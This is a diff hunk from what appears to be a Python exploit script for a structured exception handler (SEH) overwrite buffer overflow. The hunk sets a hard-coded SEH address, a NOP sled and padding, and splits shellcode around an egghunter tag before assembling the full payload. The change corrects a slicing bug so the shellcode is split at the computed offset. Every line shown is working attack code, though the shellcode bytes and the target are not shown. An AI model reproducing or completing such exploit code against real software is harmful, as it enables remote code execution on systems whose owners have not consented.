@@ -177,8 +177,8 @@ seh = "\xdb\x65\x41\x00" #004165db
 nops = "\x90"*100
 morejunk = "B" * (330-(len(junk)+len(tag)+len(shellcode)))
 calcp1 = 330-(len(junk)+len(tag)+len(egg2))
-shellp1 = shellcode[:shellp1]
-shellp2 = shellcode[shellp1:]
+shellp1 = shellcode[:calcp1]
+shellp2 = shellcode[calcp1:]
 
 # Full payload calculation
 payload = junk + tag + shellp1 + egg2 + nseh + seh + nops + eggh + tag + shellp2
